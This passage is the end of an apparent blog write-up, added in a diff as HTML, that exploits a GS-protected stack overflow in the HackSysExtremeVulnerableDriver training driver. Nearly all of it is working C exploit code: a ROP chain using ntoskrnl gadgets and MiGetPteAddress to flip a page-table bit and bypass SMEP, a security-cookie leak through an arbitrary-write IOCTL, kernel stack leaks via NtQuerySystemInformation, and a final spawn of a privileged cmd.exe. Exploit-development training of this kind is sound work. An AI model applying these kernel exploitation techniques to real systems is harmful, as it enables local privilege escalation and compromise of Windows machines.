+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4545454545454545</span>;
+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4646464646464646</span>;
+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4747474747474747</span>;
+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4848484848484848</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40ed4e</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000008</span>; <span style="color:#75715e">// Set RDX to 0x08, we will need this to accomplish the XOR
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     userland code. The setup is as follows:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       RAX -&gt; VOID *MiGetPteAddress(
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         ( RCX == PTE / Userland Code )
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       );
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Once the call is complete RAX should contain the pointer to our PTE. */</span>
+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x57699c</span>;       <span style="color:#75715e">// pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)shellcode; <span style="color:#75715e">// *shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24aaec</span>;       <span style="color:#75715e">// MiGetPteAddress()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
+</span></span><span style="display:flex;"><span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30fcf3</span>; <span style="color:#75715e">// sub rax, rdx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x54f344</span>; <span style="color:#75715e">// push rax ; pop rbx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40ed4e</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000004</span>; <span style="color:#75715e">// 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3788b6</span>; <span style="color:#75715e">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xC</span>; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    payload[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)shellcode;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Generated %d bytes ...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (i <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>)));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (i <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* WriteBytes():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Arbitrary write located in the TriggerArbitraryWrite() function */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">WriteBytes</span>(HANDLE hHEVD, <span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span> u64What, <span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span> u64Where)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  WRITE_WHAT_WHERE www <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  www.ullpWhere <span style="color:#f92672">=</span> u64Where;
+</span></span><span style="display:flex;"><span>  www.ullpWhat <span style="color:#f92672">=</span> u64What;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Writing 0x%p to 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, www.ullpWhat, www.ullpWhere);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  ARBITRARY_WRITE_IOCTL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>www,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(WRITE_WHAT_WHERE),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* LeakCookie():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Leverage the ARBITRARY_WRITE_IOCTL to write to our variable in Userland from
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Kernel Land. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">LeakCookie</span>(HANDLE hHEVD, LPVOID lpvHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> cookie <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>pu64Cookie <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(lpvHEVD <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Cookie located @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pu64Cookie);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">WriteBytes</span>(hHEVD, pu64Cookie, <span style="color:#f92672">&amp;</span>cookie);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[+] Cookie leaked: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, cookie);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> cookie;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">LeakStack</span>(<span style="color:#66d9ef">wchar_t</span> <span style="color:#f92672">*</span>targetPoC, LPVOID <span style="color:#f92672">*</span>lpvStackLeak)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HMODULE ntdll <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">&#34;ntdll&#34;</span>));
+</span></span><span style="display:flex;"><span>  PNtQuerySystemInformation query <span style="color:#f92672">=</span> (PNtQuerySystemInformation)<span style="color:#a6e22e">GetProcAddress</span>(ntdll, <span style="color:#e6db74">&#34;NtQuerySystemInformation&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (query <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;GetProcAddress() failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ULONG len <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000</span>;
+</span></span><span style="display:flex;"><span>  NTSTATUS status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>  PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    len <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>    pProcessInfo <span style="color:#f92672">=</span> (PSYSTEM_EXTENDED_PROCESS_INFORMATION)<span style="color:#a6e22e">GlobalAlloc</span>(GMEM_ZEROINIT, len);
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>(SystemExtendedProcessInformation, pProcessInfo, len, <span style="color:#f92672">&amp;</span>len);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (status <span style="color:#f92672">==</span> (NTSTATUS)<span style="color:#ae81ff">0xc0000004</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> (NTSTATUS)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NtQuerySystemInformation failed with error code 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, status);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  LPVOID stackBase <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID stackLimit <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (pProcessInfo<span style="color:#f92672">-&gt;</span>NextEntryOffset <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Strangely I was able to do this with the pProcessInfo-&gt;ImageName.Buffer being NULL? 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrW</span>(pProcessInfo<span style="color:#f92672">-&gt;</span>ImageName.Buffer, targetPoC) <span style="color:#f92672">!=</span> NULL) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Leaking stack from %ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, targetPoC);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pProcessInfo<span style="color:#f92672">-&gt;</span>NumberOfThreads; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        stackBase <span style="color:#f92672">=</span> pProcessInfo<span style="color:#f92672">-&gt;</span>Threads[i].StackBase;
+</span></span><span style="display:flex;"><span>        stackLimit <span style="color:#f92672">=</span> pProcessInfo<span style="color:#f92672">-&gt;</span>Threads[i].StackLimit;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef _WIN64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Stack base 0x%p</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Stack limit 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, stackBase, stackLimit);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Stack base 0x%X</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Stack limit 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, stackBase, stackLimit);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pProcessInfo<span style="color:#f92672">-&gt;</span>NextEntryOffset) {
+</span></span><span style="display:flex;"><span>      pProcessInfo <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      pProcessInfo <span style="color:#f92672">=</span> (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo <span style="color:#f92672">+</span> pProcessInfo<span style="color:#f92672">-&gt;</span>NextEntryOffset);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>lpvStackLeak <span style="color:#f92672">=</span> stackBase;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Stack Overflow (GS) */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> cookie <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  DWORD dwExploitBuffer <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  LPVOID lpvStackLeak <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID lpvMemoryAlloc <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID lpvHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;HEVD&#34;</span>);
+</span></span><span style="display:flex;"><span>  LPVOID lpvNtKrnl <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;ntoskrnl&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvHEVD <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvNtKrnl <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of ntoskrnl</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation started....</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Base address of HEVD @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvHEVD);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Base address of NT @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvNtKrnl);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Attempting to leak __security_cookie</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">LeakCookie</span>(hHEVD, lpvHEVD);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (cookie <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to leak stack cookie</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* I found I need to hammer the stack leak to get it to work :| */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">LeakStack</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;poc.exe&#34;</span>, <span style="color:#f92672">&amp;</span>lpvStackLeak);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lpvStackLeak <span style="color:#f92672">!=</span> NULL) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvStackLeak <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to leak stack address</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvMemoryAlloc <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
+</span></span><span style="display:flex;"><span>                                ALLOCATION_SIZE,
+</span></span><span style="display:flex;"><span>                                (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                                PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvMemoryAlloc <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to create exploitation buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  dwExploitBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">GenerateExploitBuffer</span>(lpvNtKrnl, lpvStackLeak, cookie, lpvMemoryAlloc);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Sending payload!!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dwExploitBuffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  STACK_OVERFLOW_GS_IOCTL,
+</span></span><span style="display:flex;"><span>                  lpvMemoryAlloc,
+</span></span><span style="display:flex;"><span>                  dwExploitBuffer,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation success!!! Enjoy de shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once sent we, we get our privileged shell!</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/exploit.gif" alt="alt text"></p>
+<h1 id="sources">Sources</h1>
+<pre tabindex="0"><code>https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
+https://github.com/sam-b/windows_kernel_address_leaks/tree/3810bec445c0afaa4e23338241ba0359aea398d1
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
